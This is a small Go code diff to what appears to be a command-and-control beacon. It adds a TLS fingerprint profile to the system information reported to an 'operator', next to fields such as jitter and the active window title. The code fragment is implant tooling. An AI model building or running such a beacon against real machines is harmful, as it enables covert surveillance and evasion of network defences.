@@ -60,6 +60,9 @@ func getSystemInfo() map[string]string {
 		"jitter":        strconv.Itoa(Jitter),
 		"active_window": getActiveWindowTitle(),
 	}
+	// Reported once per beacon like the rest: the operator asked for a fingerprint, and "which one did this build actually use"
+	// is answerable at build time even though the server can never see the handshake itself.
+	info["tls_profile"] = configuredTLSProfile()
 	return info
 }
 
